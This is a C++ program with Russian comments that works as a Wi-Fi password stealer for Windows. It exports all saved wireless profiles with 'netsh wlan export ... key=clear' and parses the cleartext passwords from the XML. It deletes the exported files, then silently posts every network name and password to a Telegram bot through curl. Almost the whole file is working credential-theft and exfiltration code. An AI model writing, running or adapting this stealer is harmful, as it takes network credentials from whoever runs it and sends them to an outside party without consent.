//TODO переписать ебаный говнокод, работает через жопу, из-за этого медленно

#include "pugixml.hpp"
#include "wifi_scanner.h"
#include <iostream>
#include <sstream>
#include <windows.h>
#include <clocale>
#include <codecvt> 
#include <locale>
#include <stdexcept>
#include <filesystem> // Нужен C++17

using namespace std;
namespace fs = filesystem;

void send_message(string chat_id, string token, string message){ // Функция чтобы отправлять соо в тг по чатид
    string command = "curl -s -X POST https://api.telegram.org/bot" + token + 
                          "/sendMessage -d chat_id=" + chat_id + 
                          " -d text=\"" + message + "\" > nul 2>&1";
    system(command.c_str());
}

wstring to_wstring(const string& str) {
    // Создаем конвертер из UTF-8 в UTF-16 (wchar_t)
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(str);
}

int main(){
	setlocale(LC_ALL, ""); // Кодировка

	vector<string> network_list = get_wifi_networks(); // Получаем список сетей из своей библотеки(написаной ии)
	stringstream ss; // Создаю "редактор строки"
	wstringstream wss; // Создаю "редактор wстроки"
	stringstream resultss; // сс в который будет записоваться все

	string name;

	// cout << "Print network name (\"sl\" to show network list): ";
	// cin >> name;

	// if (name == "sl"){
	// 	int i = 1;
	// 	cout << "[CONNECTED NETWORKS]" << endl;
	// 	cout << network_list.size() << " networks connected earlier." << endl;

	// 	for (const string network: network_list){
	// 		cout << i << ". " << network << endl;
	// 		i++;
	// 	}

	// 	return 0;
	// }

	fs::create_directory("networks"); // Создаю папку, в которой будут сети
	fs::path current_path = fs::current_path() / "networks"; //Получаю путь к директории, в которой лежит программа а затем добавляю к ней папку

	for (const string name : network_list){
	
	ss << "netsh wlan export profile name=\"" << name << "\" folder=" << current_path << " key=clear > nul"; //Совмещаю все в бульйон
	string stroke = ss.str(); //Бульйон => строка
	ss.str("");
	ss.clear();

	const char* cmd = stroke.c_str(); //Строка => массив чаров(систем принимает массив чаров а не строку)
	system(cmd); // Выполняем команду
	

	try {
		pugi::xml_document doc; // Создаю обьект класса либы, которая читает хмл файлы
        for (const auto& entry : fs::directory_iterator(current_path)) {
        	
        	wstring filepath = entry.path().wstring(); // wСтрока(потому что ютф8 для кирилицы и пробелов) в которой лежит путь к созданому файлу
			wstring w_name = to_wstring(name); // Делаю имя wстрокой чтобы совместить с путем без конфликта типов
		
        	wss << w_name << L".xml"; // Совмещаю все в бульйон 
        	wstring fullname = wss.str(); // Перевожу бульйон в wстроку
        	wss.str(L"");
        	wss.clear();

        	wstring newpath = current_path/fullname; // Новый путь с переименованой сетью

        	fs::rename(filepath, newpath); // Переименовываю кирилицу и пробелы в обычное имя сети, чтобы либа нормально нашла его
	
			doc.load_file(newpath.c_str()); // Подгружаю переименованый файл в либу
   			pugi::xml_node keyMaterial = doc.child("WLANProfile").child("MSM").child("security").child("sharedKey").child("keyMaterial"); // Достаю нужный тэг
   			string password = keyMaterial.child_value(); // Полчаю пароль с нужного тега

   			if (password != ""){
   				resultss << "Name: " << name << " | Password: " << password << "%0A"; // %0A — это перенос строки для HTTP-запросов

   			}else{
   				resultss << "There is no password on the \"" << name << "\" network.%0A";
   			}
   			fs::remove(newpath); // Удаляю сеть
   		}
    } catch (const fs::filesystem_error& e) {
        fs::remove_all(current_path); // Если что-то идет по пизде удаляем папку и создаем заново
        fs::create_directory("networks");
    }

	}

	fs::remove_all(current_path); // Удаляю папку с сетями
    send_message("chat_id", "token", resultss.str()); // Отправляю себе в тг
    
    return 0;
}
